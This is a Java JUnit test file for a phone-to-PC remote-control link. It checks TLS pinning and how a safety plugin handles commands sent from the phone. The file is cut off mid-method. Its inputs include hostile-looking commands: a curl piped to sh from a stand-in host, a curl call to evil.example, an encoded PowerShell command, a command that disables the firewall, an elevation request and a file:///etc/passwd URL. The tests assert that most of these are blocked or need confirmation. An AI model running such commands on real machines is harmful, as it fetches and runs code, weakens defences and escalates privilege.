package com.onesay.assistant.v2.pclink;

import org.junit.AfterClass;
import org.junit.Assume;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.Assert.*;

/**
 * [pclink v2] 与电脑端 OneSay 0.5.0 真进程互通（真 socket，含 TLS）：
 * <ol>
 *   <li>逐字节：证书指纹算法、配对串 v2 解析与电脑端 {@code Config.importPairing} 一致；</li>
 *   <li>TLS：钉电脑证书指纹连上、下令；指纹不对 → tls；同一手机 id 换证书 → pin（4003）；用 TLS 连过再走明文 → pin（4002，防降级）；
 *       没见过的旧版（v1 明文）手机照样能用；</li>
 *   <li>电脑 → 手机：手机端 {@link PcRx.Loop} 常连（hold），测试经电脑端界面接口 /api/phone 下令：找手机 / 状态 / 剪贴板 /
 *       关着的项被拒；断开后电脑报离线不排队。</li>
 * </ol>
 * 电脑端 jar 同 {@link PcDesktopInteropTest}（缺省 /tmp/osd-build/onesay-desktop.jar，缺 jar 整类跳过）。
 */
public class PcLinkV2InteropTest {

    static File jar;
    static URLClassLoader cl;
    static Process proc;
    static Path dir;
    static int port, uiPort;
    static String token;
    static final byte[] KEY = new byte[32];
    static final String PC = "pc-v2";

    @BeforeClass public static void startDesktop() throws Exception {
        jar = PcDesktopInteropTest.findJar();
        Assume.assumeTrue("电脑端 jar 不在，v2 互通测试跳过", jar != null);
        cl = new URLClassLoader(new URL[]{jar.toURI().toURL()}, ClassLoader.getPlatformClassLoader());
        Assume.assumeTrue("电脑端 jar 不是 0.5.0+（没有 Tls 类），v2 互通测试跳过", hasClass("com.onesay.desktop.Tls"));
        new java.security.SecureRandom().nextBytes(KEY);
        port = PcDesktopInteropTest.freePort();
        dir = Files.createTempDirectory("pclink-v2");
        Path cfg = dir.resolve("desktop.properties").toAbsolutePath();
        String props = "lan_port=" + port + "\ndevice_id=" + PC + "\nkind=pc\nptt=off\npair_key=" + PcB64.encodeUrl(KEY) + "\n";
        Files.write(cfg, props.getBytes(StandardCharsets.UTF_8));
        String java = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
        ProcessBuilder pb = new ProcessBuilder(java, "-Djava.awt.headless=true", "-jar", jar.getAbsolutePath(), "--config", cfg.toString(), "app", "--tray");
        pb.environment().put("ONESAY_TEST_ACTIONS", "1");
        pb.environment().put("ONESAY_UI_PORT", "0");
        pb.environment().remove("APPDATA");
        pb.redirectErrorStream(true).redirectOutput(dir.resolve("desktop.out").toFile());
        proc = pb.start();
        long end = System.currentTimeMillis() + 20000;
        Pattern ui = Pattern.compile("界面 http://127\\.0\\.0\\.1:(\\d+)/");
        while (System.currentTimeMillis() < end && uiPort == 0) {
            if (!proc.isAlive()) fail("电脑端进程提前退出：" + out());
            Matcher m = ui.matcher(out());
            if (m.find()) uiPort = Integer.parseInt(m.group(1));
            else Thread.sleep(150);
        }
        assertTrue("电脑端界面没起来：" + out(), uiPort > 0);
        Matcher t = Pattern.compile("const TOKEN='([A-Za-z0-9_-]+)'").matcher(http("GET", "/", null, null));
        assertTrue(t.find());
        token = t.group(1);
    }

    static boolean hasClass(String n) {
        try {
            cl.loadClass(n);
            return true;
        } catch (Throwable e) {
            return false;
        }
    }

    static String out() throws Exception {
        return new String(Files.readAllBytes(dir.resolve("desktop.out")), StandardCharsets.UTF_8);
    }

    @AfterClass public static void stopDesktop() throws Exception {
        if (proc != null) {
            proc.destroy();
            if (!proc.waitFor(5, TimeUnit.SECONDS)) proc.destroyForcibly();
        }
        if (dir != null) {
            File[] fs = dir.toFile().listFiles();
            if (fs != null) for (File f : fs) f.delete();
            dir.toFile().delete();
        }
    }

    static String http(String method, String path, String tok, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL("http://127.0.0.1:" + uiPort + path).openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(3000);
        c.setReadTimeout(30000);
        if (tok != null) c.setRequestProperty("X-OneSay-Token", tok);
        if (body != null) {
            c.setDoOutput(true);
            OutputStream o = c.getOutputStream();
            o.write(body.getBytes(StandardCharsets.UTF_8));
            o.close();
        }
        InputStream in = c.getInputStream();
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) b.write(buf, 0, n);
        in.close();
        return new String(b.toByteArray(), StandardCharsets.UTF_8);
    }

    static Map<String, Object> api(String name, Map<String, Object> body) throws Exception {
        return PcJson.obj(http("POST", "/api/" + name, token, PcJson.stringify(body == null ? new TreeMap<String, Object>() : body)));
    }

    static String pairing() throws Exception {
        return String.valueOf(api("pairing", null).get("pairing"));
    }

    static PcLanClient.Peer peer(String me, PcTls tls, String fp) throws Exception {
        PcPairing p = PcPairing.parse(pairing());
        return new PcLanClient.Peer(me, p.peer, p.key, "127.0.0.1:" + port, p.lanPort, "", fp, tls);
    }

    // ------------------------------------------------------------------ 逐字节

    @Test public void fingerprintAndPairingMatchDesktop() throws Exception {
        String s = pairing();
        PcPairing mine = PcPairing.parse(s);
        assertEquals(2, mine.version);
        assertTrue(PcTls.validFp(mine.fp));
        Class<?> cfgC = cl.loadClass("com.onesay.desktop.Config");
        Object c = cfgC.getConstructor(Path.class).newInstance((Path) null);
        assertEquals(PC, cfgC.getMethod("importPairing", String.class).invoke(c, s));
        assertEquals(cfgC.getField("peerFp").get(c), mine.fp);
        Class<?> tlsC = cl.loadClass("com.onesay.desktop.Tls");
        PcTls t = PcTls.generate("x");
        byte[] der = t.cert.getEncoded();
        assertEquals("指纹算法两端一致", tlsC.getMethod("fingerprint", byte[].class).invoke(null, der), PcTls.fingerprint(der));
        assertEquals(tlsC.getMethod("shortFp", String.class).invoke(null, t.fp), PcTls.shortFp(t.fp));
        // 电脑端生成的证书手机端能解析、指纹一致
        Object dt = tlsC.getMethod("generate", String.class).invoke(null, "pc");
        String dfp = (String) tlsC.getField("fp").get(dt);
        PcTls back = PcTls.load(PcB64.encodeUrl(((java.security.PrivateKey) tlsC.getField("key").get(dt)).getEncoded()),
                PcB64.encodeUrl(((java.security.cert.X509Certificate) tlsC.getField("cert").get(dt)).getEncoded()));
        assertNotNull(back);
        assertEquals(dfp, back.fp);
        // 手机端生成的 hello（带 cfp/hold）电脑端验签通过
        Class<?> proto = cl.loadClass("com.onesay.desktop.Protocol");
        Class<?> guard = cl.loadClass("com.onesay.desktop.Protocol$ReplayGuard");
        Method verify = proto.getMethod("verify", byte[].class, String.class, String.class, String.class, Map.class, long.class, guard);
        long now = System.currentTimeMillis();
        assertEquals("OK", String.valueOf(verify.invoke(null, KEY, "h1", "phone-x", PC, PcProtocol.hello(KEY, "h1", "phone-x", PC, now, t.fp, true), now, null)));
    }

    // ------------------------------------------------------------------ TLS

    @Test public void tlsPinnedWorksAndMismatchesAreRejected() throws Exception {
        PcTls mine = PcTls.generate("phone-tls1");
        PcLanClient.Peer p = peer("phone-tls1", mine, null);
        p = new PcLanClient.Peer(p.me, p.peer, p.key, p.lanHosts, p.lanPort, "", PcPairing.parse(pairing()).fp, mine);
        InetSocketAddress a = PcLanClient.locate(p, 3000, null);
        assertNotNull(a);
        PcLanClient.Session s = PcLanClient.Session.open(p, a, 5000);
        try {
            assertTrue("走的是 TLS", s.tls());
            PcLanClient.Result r = s.request("ping", null, 5000);
            assertTrue(r.toString(), r.ok);
            PcLanClient.Result shot = s.request("screenshot", null, 15000);
            assertTrue("大消息过 TLS", shot.ok && PcB64.decode(String.valueOf(shot.data.get("b64"))).length > 1000);
        } finally {
            s.close();
        }

        // 配对串里的指纹不是这台电脑 → 握手不过
        PcLanClient.Peer wrong = new PcLanClient.Peer("phone-tls2", p.peer, p.key, p.lanHosts, p.lanPort, "", PcTls.generate("mitm").fp, PcTls.generate("p2"));
        PcLanClient.Result w = PcLanClient.once(wrong, "ping", null, 1500, 5000, null, null);
        assertFalse(w.ok);
        assertEquals("tls", w.fail);

        // 同一个手机 id 换了证书（重装 / 冒充）→ 电脑记住的是旧的 → 4003
        PcLanClient.Peer other = new PcLanClient.Peer("phone-tls1", p.peer, p.key, p.lanHosts, p.lanPort, "", p.fp, PcTls.generate("p1-new"));
        PcLanClient.Result o = PcLanClient.once(other, "ping", null, 1500, 5000, null, null);
        assertFalse(o.ok);
        assertEquals("pin", o.fail);

        // 用 TLS 连过的手机退回明文 → 4002（防降级）
        PcLanClient.Peer plain = new PcLanClient.Peer("phone-tls1", p.peer, p.key, p.lanHosts, p.lanPort, "");
        PcLanClient.Result d = PcLanClient.once(plain, "ping", null, 1500, 5000, null, null);
        assertFalse(d.ok);
        assertEquals("pin", d.fail);
        assertTrue(d.text, d.text.contains("加密"));

        // 没见过的旧版手机（v1 明文）照样能用
        PcLanClient.Peer legacy = new PcLanClient.Peer("phone-legacy", p.peer, p.key, p.lanHosts, p.lanPort, "");
        assertTrue(PcLanClient.once(legacy, "ping", null, 1500, 5000, null, null).ok);
    }

    // ------------------------------------------------------------------ 电脑 → 手机

    static final class JvmEnv implements PcRx.Env, PcRx.Handler {
        final PcLanClient.Peer p;
        volatile boolean wanted = true;
        volatile String state = "";
        final List<String> ran = new CopyOnWriteArrayList<String>();
        final List<String> rec = new CopyOnWriteArrayList<String>();

        JvmEnv(PcLanClient.Peer p) { this.p = p; }

        @Override public boolean wanted() { return wanted; }
        @Override public boolean onLan() { return true; }
        @Override public PcLanClient.Peer peer() { return p; }
        @Override public List<InetAddress> extraBroadcasts() { return null; }
        @Override public void multicast(boolean hold) { }
        @Override public void state(String s, String d) { state = s + " " + d; }
        @Override public void remember(InetSocketAddress a) { }
        @Override public PcRx.Handler handler() { return this; }
        @Override public boolean enabled(String cmd) { return !PcRxPolicy.OPEN_APP.equals(cmd); }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            ran.add(cmd + (PcRxPolicy.CLIPBOARD.equals(cmd) ? "(" + String.valueOf(args.get("text")).length() + ")" : String.valueOf(args)));
            Map<String, Object> d = new TreeMap<String, Object>();
            if (PcRxPolicy.STATUS.equals(cmd)) {
                d.put("battery", 42L);
                d.put("charging", Boolean.FALSE);
                d.put("ringer", "静音");
            }
            return new PcLanClient.Result(true, PcRxPolicy.FIND.equals(cmd) ? "手机正在响（30 秒）" : "好", d, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { rec.add(cmd + (ok ? ":ok" : ":fail")); }
    }

    static Map<String, Object> phone(String cmd, Map<String, Object> args) throws Exception {
        Map<String, Object> b = new TreeMap<String, Object>();
        b.put("cmd", cmd);
        b.put("args", args == null ? new TreeMap<String, Object>() : args);
        return api("phone", b);
    }

    @Test public void pcCommandsPhoneOverHeldTlsChannel() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-rx1", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-rx1"));
        JvmEnv env = new JvmEnv(p);
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, "rx-test");
        t.setDaemon(true);
        t.start();
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
            assertTrue(env.state, env.state.contains("加密"));
            Thread.sleep(200);

            Map<String, Object> st = api("state", null);
            assertEquals("电脑端知道这台手机常连着", "phone-rx1", st.get("phone"));
            assertEquals("局域网·加密", ((Map<?, ?>) st.get("peers")).get("phone-rx1"));

            Map<String, Object> a = new TreeMap<String, Object>();
            a.put("action", "start");
            Map<String, Object> r = phone("find_phone", a);
            assertEquals(String.valueOf(r), Boolean.TRUE, r.get("ok"));
            assertEquals("手机正在响（30 秒）", r.get("text"));

            Map<String, Object> s = phone("status", null);
            assertEquals(Boolean.TRUE, s.get("ok"));
            assertTrue(String.valueOf(s.get("text")), String.valueOf(s.get("text")).contains("电量 42%"));
            assertEquals(42L, ((Map<?, ?>) s.get("data")).get("battery"));

            Map<String, Object> c = new TreeMap<String, Object>();
            c.put("text", "从电脑来的文字 abc");
            assertEquals(Boolean.TRUE, phone("clipboard_set", c).get("ok"));

            Map<String, Object> app = new TreeMap<String, Object>();
            app.put("name", "微信");
            Map<String, Object> off = phone("open_app", app);
            assertEquals("手机上关着的项被拒", Boolean.FALSE, off.get("ok"));
            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));

            Map<String, Object> bad = new TreeMap<String, Object>();
            bad.put("url", "file:///etc/passwd");
            assertEquals("电脑端先挡掉非 http(s)", Boolean.FALSE, phone("open_url", bad).get("ok"));

            assertEquals(3, env.ran.size());
            assertTrue(env.ran.toString(), env.ran.get(0).startsWith("find_phone") && env.ran.get(2).equals("clipboard_set(11)"));
            assertTrue(env.rec.contains("open_app:fail"));

            // 手机按钮那边的一次性连接不顶掉常连
            PcLanClient.Result once = PcLanClient.once(p, "ping", null, 1500, 5000, null, null);
            assertTrue(once.ok);
            Thread.sleep(200);
            assertEquals(Boolean.TRUE, phone("status", null).get("ok"));
        } finally {
            env.wanted = false;
            loop.stop();
            t.join(5000);
        }
        Thread.sleep(500);
        long t0 = System.currentTimeMillis();
        Map<String, Object> gone = phone("ping", null);
        assertEquals("手机断开后电脑报离线、不排队", Boolean.FALSE, gone.get("ok"));
        assertTrue(String.valueOf(gone.get("text")), String.valueOf(gone.get("text")).contains("离线"));
        assertTrue(System.currentTimeMillis() - t0 < 9000);
    }

    // ------------------------------------------------------------------ [恢复手机] 手机作为被控端回到分档之前 + 电脑端两轴 / 安全插件

    static Map<String, Object> mm(Object... kv) {
        Map<String, Object> x = new TreeMap<String, Object>();
        for (int i = 0; i < kv.length; i += 2) x.put((String) kv[i], kv[i + 1]);
        return x;
    }

    static String why(Map<String, Object> r) {
        Object d = r.get("data");
        return d instanceof Map ? String.valueOf(((Map<?, ?>) d).get("reason")) : "";
    }

    /**
     * [恢复手机] 改：原来的 phoneLevelAndReasonCodesReachDesktop 测手机端执行级别（级别 / 手机上确认 / 生成脚本）经电脑界面回来。
     * 手机恢复到分档之前后，改成：电脑 → 手机只看逐项开关，网址 / 剪贴板 / App 不再被手机端按类别拦；手机端的新指令电脑也不再下发。
     */
    @Test public void phoneTargetRestoredToPreLevelSemantics() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-old", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-old"));
        JvmEnv env = new JvmEnv(p);
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, "rx-old");
        t.setDaemon(true);
        t.start();
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
            Thread.sleep(200);
            Map<String, Object> caps = phone("caps", null);
            assertEquals(Boolean.TRUE, caps.get("ok"));
            assertNull("手机不再报执行级别", ((Map<?, ?>) caps.get("data")).get("level"));
            assertEquals("", api("state", null).get("phone_level"));
            // 原来自动档要手机确认的：不在信任列表的网址、写剪贴板 —— 现在直接做
            assertEquals(Boolean.TRUE, phone("open_url", mm("url", "https://example.org/")).get("ok"));
            assertEquals(Boolean.TRUE, phone("clipboard_set", mm("text", "从电脑来的文字")).get("ok"));
            // 关着的项照旧被拒（JvmEnv 关了 open_app）
            Map<String, Object> off = phone("open_app", mm("name", "微信"));
            assertEquals(Boolean.FALSE, off.get("ok"));
            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
            // [第二轮] 改：8 个指令按「每项一个开关、不分档」加回来了（用户决定 3），电脑又能下发；原来断言 sys_exec「不支持」
            Map<String, Object> back = phone("sys_exec", mm("command", "echo hi"));
            assertEquals(String.valueOf(back.get("text")), Boolean.TRUE, back.get("ok"));
            assertTrue(env.ran.toString(), env.ran.toString().contains("open_url") && env.ran.toString().contains("clipboard_set") && env.ran.toString().contains("sys_exec"));
        } finally {
            env.wanted = false;
            loop.stop();
            t.join(5000);
        }
    }

    /** [第二轮] 手机端：JVM 执行端 + 红线 Guard（临时工作区；com.android.* 当系统 App）。 */
    static final class GuardEnv implements PcRx.Env, PcRx.Handler, PcRx.Guard {
        final JvmEnv base;
        final java.util.Set<String> off = new java.util.HashSet<String>();
        final File ws;

        GuardEnv(PcLanClient.Peer p, File ws) {
            this.base = new JvmEnv(p);
            this.ws = ws;
        }

        @Override public boolean wanted() { return base.wanted; }
        @Override public boolean onLan() { return true; }
        @Override public PcLanClient.Peer peer() { return base.p; }
        @Override public List<InetAddress> extraBroadcasts() { return null; }
        @Override public void multicast(boolean hold) { }
        @Override public void state(String s, String d) { base.state = s + " " + d; }
        @Override public void remember(InetSocketAddress a) { }
        @Override public PcRx.Handler handler() { return this; }
        @Override public boolean enabled(String cmd) { return !off.contains(cmd); }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            base.ran.add(cmd + args);
            Map<String, Object> d = new TreeMap<String, Object>();
            if (PcRxPolicy.FILE_LIST.equals(cmd)) d.put("files", java.util.Arrays.<Object>asList("inbox/a.txt"));
            if (PcRxPolicy.SCRIPT_LIST.equals(cmd)) d.put("scripts", new ArrayList<Object>(LinkPolicy.listScripts(ws)));
            if (PcRxPolicy.SYS_EXEC.equals(cmd)) d.put("output", "hi");
            return new PcLanClient.Result(true, "好", d, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { }

        @Override public void appFacts(String cmd, Map<String, Object> a, LinkPolicy.Facts f) {
            String pkg = PcRxPolicy.str(a, "package");
            f.appSystem = pkg.startsWith("com.android.");
            f.appBlocked = f.appBlocked || LinkPolicy.blockedApp(pkg, PcRxPolicy.str(a, "name"));
        }

        @Override public File workspace() { return ws; }

        @Override public String script(String cmd, Map<String, Object> a, String why) {
            return LinkPolicy.writeScript(ws, LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "授权", PcRxPolicy.str(a, "command"), System.currentTimeMillis()));
        }
    }

    /**
     * [第二轮] 真电脑端 jar：电脑界面接口 /api/phone 能发出加回来的 8 个指令，手机不确认、按开关直接做；
     * caps 列出它们；关着的项拒；红线（支付类 / 系统 App / 网址 / 剪贴板 / 授权只生成脚本）的原因码回到电脑。
     */
    @Test public void extraPhoneCommandsThroughDesktopApi() throws Exception {
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-extra", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-extra"));
        File ws = java.nio.file.Files.createTempDirectory("interop-ws").toFile();
        GuardEnv env = new GuardEnv(p, ws);
        PcRx.Loop loop = new PcRx.Loop(env);
        loop.minBackoff = 300;
        loop.maxBackoff = 1000;
        Thread t = new Thread(loop, "rx-extra");
        t.setDaemon(true);
        t.start();
        try {
            long end = System.currentTimeMillis() + 10000;
            while (!env.base.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
            assertTrue("常连没连上：" + env.base.state, env.base.state.startsWith(PcRx.S_UP));
            Thread.sleep(200);
            Map<?, ?> caps = (Map<?, ?>) phone("caps", null).get("data");
            for (String c : PcRxPolicy.EXTRA) {
                assertTrue(c, ((List<?>) caps.get("caps")).contains(c));
                assertTrue(c, ((List<?>) caps.get("known")).contains(c));
            }
            Object[][] ok = {
                    {"flashlight", mm("on", Boolean.TRUE)}, {"setting_set", mm("name", "brightness", "value", "40")},
                    {"file_write", mm("path", "inbox/a.txt", "text", "来自电脑")}, {"file_list", null},
                    {"uninstall_app", mm("package", "com.example.game")}, {"script_list", null},
                    {"script_run", mm("name", "ok.sh")}, {"sys_exec", mm("command", "echo hi")}};
            for (Object[] x : ok) {
                @SuppressWarnings("unchecked")
                Map<String, Object> r = phone((String) x[0], (Map<String, Object>) x[1]);
                assertEquals(x[0] + "：" + r.get("text"), Boolean.TRUE, r.get("ok"));
            }
            assertEquals(8, env.base.ran.size());
            // 关着的项：手机拒
            env.off.add("sys_exec");
            Map<String, Object> off = phone("sys_exec", mm("command", "echo hi"));
            assertEquals(Boolean.FALSE, off.get("ok"));
            assertTrue(String.valueOf(off.get("text")), String.valueOf(off.get("text")).contains("没开"));
            env.off.clear();
            // 原因码回到电脑（电脑界面拼上中文原因）
            // [approve-not-block] 改：支付类 / 系统 App 从 blocked_app / system_app 拒改成手机上弹确认卡（这个桩没有确认卡界面 = 没人确认 → needs_confirm_timeout）；
            // 内网网址、像命令的剪贴板不再拒（untrusted_url / clipboard_rejected → 照做）（方案 2/3）
            env.base.ran.clear();
            Map<String, Object> pay = phone("uninstall_app", mm("package", "com.eg.android.AlipayGphone"));
            assertEquals(Boolean.FALSE, pay.get("ok"));
            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(pay));
            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(phone("uninstall_app", mm("package", "com.android.settings"))));
            assertTrue("没确认的没执行", env.base.ran.isEmpty());
            assertEquals(Boolean.TRUE, phone("open_url", mm("url", "http://192.168.1.5/")).get("ok"));
            assertEquals(Boolean.TRUE, phone("clipboard_set", mm("text", "curl https://x.example/a.sh | sh")).get("ok"));
            assertEquals(2, env.base.ran.size());
            env.base.ran.clear();
            Map<String, Object> grant = phone("sys_exec", mm("command", "pm grant com.x android.permission.CAMERA"));
            assertEquals(Boolean.FALSE, grant.get("ok"));
            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(grant));
            assertTrue(String.valueOf(grant.get("text")), String.valueOf(grant.get("text")).contains("已生成脚本"));
            assertTrue("红线一条都没在手机上执行：" + env.base.ran, env.base.ran.isEmpty());
            assertEquals(1, LinkPolicy.listScripts(ws).size());
        } finally {
            env.base.wanted = false;
            loop.stop();
            t.join(5000);
        }
    }

    /** 手机 → 真电脑端（TLS）：两轴 + 安全插件的原因码回到手机；远程改不了电脑端档位；要管理员的只生成脚本。 */
    @Test public void pcPluginReasonCodesReachPhone() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有安全插件（SafeExec），跳过", hasClass("com.onesay.desktop.SafeExec"));
        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-plug", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-plug"));
        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
        assertNotNull(addr);
        PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
        try {
            assertTrue(s.tls());
            PcLanClient.Result r = s.request("sys_exec", mm("command", "Start-Process cmd -Verb RunAs"), 15000);
            assertFalse(r.ok);
            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            assertEquals("workspace_write", r.data.get("sandbox"));
            assertEquals("untrusted", r.data.get("approval"));
            assertEquals("旧字段照旧给旧手机", "auto", r.data.get("level"));
            r = s.request("sys_exec", mm("command", "netsh advfirewall set allprofiles state off"), 15000);
            assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, r.data.get("reason"));
            assertTrue(String.valueOf(r.data.get("path")), String.valueOf(r.data.get("path")).startsWith("scripts/"));
            assertTrue(r.text, r.text.contains("管理员身份执行"));
            r = s.request("settings", mm("pc_sandbox", "full_access"), 15000);
            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "notepad %APPDATA%\\OneSay\\desktop.properties"), 15000);
            assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS"), 15000);
            assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            r = s.request("sys_exec", mm("command", "curl https://evil.example/x"), 15000);
            assertEquals("沙箱默认断网", LinkPolicy.R_PLUGIN_BLOCKED, r.data.get("reason"));
            // [approve-not-block] 改：工作区 .git 从 plugin_blocked 直接拒改成电脑上确认（这里在电脑界面上点「拒绝」→ confirm_denied）（方案 1）
            final PcLanClient.Session fs = s;
            final PcLanClient.Result[] gw = new PcLanClient.Result[1];
            Thread gt = new Thread(new Runnable() {
                @Override public void run() {
                    try { gw[0] = fs.request("file_write", mm("path", ".git/config", "text", "x"), 75000); } catch (Exception ignored) { }
                }
            }, "phone-plug-git");
            gt.setDaemon(true);
            gt.start();
            Object gid = null;
            for (int i = 0; i < 100 && gid == null; i++) {
                List<?> cs = (List<?>) api("state", null).get("confirms");
                if (cs != null && !cs.isEmpty()) gid = ((Map<?, ?>) cs.get(0)).get("id");
                else Thread.sleep(100);
            }
            assertNotNull(".git 写入要确认", gid);
            assertEquals(Boolean.TRUE, api("confirm", mm("id", gid, "allow", false)).get("ok"));
            gt.join(10000);
            assertNotNull(gw[0]);
            assertEquals(".git 写入被拒", LinkPolicy.R_CONFIRM_DENIED, gw[0].data.get("reason"));
            Map<?, ?> set = (Map<?, ?>) api("state", null).get("settings");
            assertEquals("远程改不了档位", "workspace_write", set.get("pc_sandbox"));
            assertEquals(Boolean.TRUE, set.get("plugin_enabled"));
            // 关插件要二次确认
            assertEquals(Boolean.FALSE, api("settings", mm("plugin_enabled", "false")).get("ok"));
            assertEquals(Boolean.TRUE, ((Map<?, ?>) api("state", null).get("settings")).get("plugin_enabled"));
        } finally {
            s.close();
        }
    }

    /** [确认框加固] 远程 / 语音不能批准电脑上的确认框：「回答确认框」类指令回 voice_approval_blocked；界面接口收到不是本机鼠标 / 键盘的「允许」也不算。 */
    @Test public void remoteOrVoiceApprovalBlockedThroughDesktop() throws Exception {
        Assume.assumeTrue("电脑端 jar 还没有确认框加固（ConfirmGate），跳过", hasClass("com.onesay.desktop.ConfirmGate"));
        assertEquals(Boolean.TRUE, api("settings", mm("pc_sandbox", "workspace_write", "pc_approval", "untrusted")).get("ok"));
        PcPairing pp = PcPairing.parse(pairing());
        PcLanClient.Peer p = new PcLanClient.Peer("phone-ag", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-ag"));
        InetSocketAddress addr = PcLanClient.locate(p, 3000, null);
        assertNotNull(addr);
        final PcLanClient.Session s = PcLanClient.Session.open(p, addr, 5000);
        try {
            assertTrue(s.tls());
            for (String n : new String[]{"confirm", "approve", "allow", "voice_approve"}) {
                PcLanClient.Result r = s.request(n, mm("id", 1, "allow", true, "always", true), 15000);
                assertFalse(n, r.ok);
                assertEquals(n, LinkPolicy.R_VOICE_APPROVAL_BLOCKED, r.data.get("reason"));
                assertEquals(LinkPolicy.reasonZh(LinkPolicy.R_VOICE_APPROVAL_BLOCKED), r.data.get("reason_zh"));
            }
            final PcLanClient.Result[] held = new PcLanClient.Result[1];
            Thread t = new Thread(new Runnable() {
                @Override public void run() {
                    try { held[0] = s.request("volume", mm("action", "up"), 40000); } catch (Exception ignored) { }
                }
            }, "phone-ag-volume");
            t.setDaemon(true);
            t.start();
            Object id = null;
            for (int i = 0; i < 100 && id == null; i++) {
                List<?> c = (List<?>) api("state", null).get("confirms");
                if (c != null && !c.isEmpty()) id = ((Map<?, ?>) c.get(0)).get("id");
                else Thread.sleep(100);
            }
            assertNotNull("电脑上应该在等确认", id);
            api("confirm", mm("op", "seen", "id", id, "focused", Boolean.TRUE));
            Thread.sleep(900);
            Map<String, Object> a = api("confirm", mm("id", id, "allow", Boolean.TRUE, "input", "voice", "trusted", Boolean.TRUE));
            assertEquals(Boolean.FALSE, a.get("ok"));
            assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, a.get("reason"));
            a = api("confirm", mm("id", id, "allow", Boolean.TRUE)); // 没说来源（旧手机 / 远程转发）
            assertEquals(LinkPolicy.R_VOICE_APPROVAL_BLOCKED, a.get("reason"));
            assertEquals("没算数，照旧在等", 1, ((List<?>) api("state", null).get("confirms")).size());
            assertEquals(Boolean.TRUE, api("confirm", mm("id", id, "allow", Boolean.FALSE, "input", "keyboard", "trusted", Boolean.TRUE)).get("ok"));
            t.join(15000);
            assertNotNull(held[0]);
            assertFalse(held[0].ok);
            assertEquals(LinkPolicy.R_CONFIRM_DENIED, held[0].data.get("reason"));
        } finally {
            s.close();
        }
    }

    // ------------------------------------------------------------------ 电脑快捷指令批准（手机 → 电脑）

    /** 后台等电脑界面上出现待确认，记下它，再按 allow / always 点掉（经电脑界面 API）。 */
    static Thread answerOnPc(final boolean allow, final boolean always, final List<Map<?, ?>> seen) {
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                try {
                    long end = System.currentTimeMillis() + 15000;
                    while (System.currentTimeMillis() < end) {
                        List<?> c = (List<?>) api("state", null).get("confirms");
                        if (c != null && !c.isEmpty()) {
                            Map<?, ?> x = (Map<?, ?>) c.get(0);
                            seen.add(x);
                            Map<String, Object> b = new TreeMap<String, Object>();
                            b.put("id", x.get("id"));
